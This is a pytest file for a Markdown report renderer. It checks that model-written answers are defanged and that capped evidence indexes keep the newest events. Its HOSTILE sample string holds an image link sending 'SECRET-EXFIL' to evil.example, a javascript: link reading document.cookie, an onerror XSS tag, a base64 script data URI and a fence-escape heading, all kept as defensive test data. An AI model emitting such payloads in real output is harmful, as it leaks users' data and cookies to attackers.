"""Model-written text is inert in the Markdown report; long sessions keep their newest events."""

from __future__ import annotations

import re

import pytest
from oyster.reports.render import MAX_INDEX_EVENTS, build_report, defang, render_markdown

DIAG = "restricted_diagnostics_requires_app_authorization"
HOSTILE = (
    "Looks fine. ![x](https://evil.example/?d=SECRET-EXFIL)\n"
    "[click me](javascript:alert(document.cookie))\n"
    "<img src=x onerror=alert(1)>\n"
    "Visit https://evil.example/path?q=1 or http://evil.example, www.evil.example and "
    "<https://auto.example/x>.\n"
    "[ref]: http://ref.example/z \"title\"\n"
    "~~~\n"
    "## Injected heading outside the block?\n"
    "```\n"
    "data:text/html;base64,PHNjcmlwdD4="
)


def _session(store) -> str:
    rec, _ = store.register_session("sim-01", None, "simulated", ["ble_check_access_policy"], "bench")
    return rec.session_id


def _run(store, sid, **fields):
    run = store.create_run(sid, fields.pop("question", "q"), {"name": "fake", "model": None, "is_fake": True})
    run.status = "succeeded"
    for k, v in fields.items():
        setattr(run, k, v)
    store.save_run(run)
    return run


def test_model_answer_cannot_inject_links_images_or_html(store, profile, check_event):
    sid = _session(store)
    events = [check_event("evt-000021", DIAG, session_id=sid, authorized=False)]
    store.add_events("sim-01", sid, events)
    from oyster.policy.evaluators import evaluate_assertion

    store.add_finding(evaluate_assertion(profile, DIAG, events, session_id=sid, target_id="target-lab-01"))
    _run(
        store,
        sid,
        question="what about ![q](https://q.example/?x=1)?",
        answer={
            "answer_markdown": HOSTILE,
            "cited_evidence_ids": ["evt-000021"],
            "limitations": ["see [here](https://lim.example/?t=1) <b>now</b>"],
        },
        error="failed: fetch https://err.example/x",
    )
    md = render_markdown(build_report(store, sid))
    for needle in ("![", "](", "<img", "<b>", "<http", "http://", "https://", "javascript:", "data:text"):
        assert needle not in md, needle
    assert "hxxps://evil[.]example/path?q=1" in md and "javascript[:]" in md
    assert "(image omitted: x; hxxps://evil[.]example/?d=SECRET-EXFIL)" in md  # shown as inert text
    assert "Model explanation (not verified" in md
    # findings and evidence are generated from the stored records, untouched by the model text
    assert "confirmed **[SIMULATED]**" in md and "`evt-000021`" in md


def test_injected_fences_cannot_close_the_plain_text_block(store):
    sid = _session(store)
    _run(store, sid, answer={"answer_markdown": HOSTILE, "cited_evidence_ids": [], "limitations": []})
    lines = render_markdown(build_report(store, sid)).splitlines()
    opens = [i for i, ln in enumerate(lines) if re.fullmatch(r"~{4,}text", ln)]
    assert len(opens) == 1  # the fence is longer than the ~~~ inside the answer
    fence = lines[opens[0]][:-4]
    close = next(i for i in range(opens[0] + 1, len(lines)) if lines[i] == fence)
    inside = "\n".join(lines[opens[0] + 1 : close])
    assert "## Injected heading outside the block?" in inside and "~~~" in inside
    assert "## Injected heading outside the block?" not in "\n".join(lines[close + 1 :])


@pytest.mark.parametrize(
    "raw, expected",
    [
        ("![alt](https://e.x/p?d=1)", "(image omitted: alt; hxxps://e[.]x/p?d=1)"),
        ("[t](javascript:alert(1))", "t (javascript[:]alert(1))"),
        ("see https://a.b/c", "see hxxps://a[.]b/c"),
        ("http://a.b", "hxxp://a[.]b"),
        ("<script>x</script>", "‹script›x‹/script›"),
        ("www.a.b", "www[.]a.b"),
        ("plain metadata: ok", "plain metadata: ok"),
    ],
)
def test_defang(raw, expected):
    assert defang(raw) == expected


def test_json_report_keeps_the_raw_answer_for_machines(store):
    sid = _session(store)
    _run(store, sid, answer={"answer_markdown": HOSTILE, "cited_evidence_ids": [], "limitations": []})
    assert build_report(store, sid)["runs"][0]["answer_markdown"] == HOSTILE


# --- newest events survive the index cap, and the cap is stated ---
def _fill(store, sid, read_event, n):
    batch = [read_event(f"evt-{i:06d}", session_id=sid, seq=i) for i in range(1, n + 1)]
    for i in range(0, n, 500):
        store.add_events("sim-01", sid, batch[i : i + 500])


def test_get_events_newest_returns_the_last_events_in_ascending_order(store, read_event):
    sid = _session(store)
    _fill(store, sid, read_event, 12)
    assert [e.sequence for e in store.get_events(sid, limit=4)] == [1, 2, 3, 4]
    assert [e.sequence for e in store.get_events(sid, limit=4, newest=True)] == [9, 10, 11, 12]
    assert [e.sequence for e in store.get_events(sid, limit=50, newest=True)] == list(range(1, 13))


def test_report_of_a_long_session_lists_the_newest_events_and_states_the_truncation(store, read_event):
    sid = _session(store)
    total = MAX_INDEX_EVENTS + 3
    _fill(store, sid, read_event, total)
    rep = build_report(store, sid)
    ids = [e["event_id"] for e in rep["evidence_index"]]
    assert len(ids) == MAX_INDEX_EVENTS
    assert ids[-1] == f"evt-{total:06d}" and ids[0] == "evt-000004" and "evt-000001" not in ids
    note = next(x for x in rep["limitations"] if x.startswith("Evidence index truncated"))
    assert f"newest {MAX_INDEX_EVENTS}" in note and f"3 oldest of {total}" in note
    assert note in render_markdown(rep).split("## Evidence index")[1]
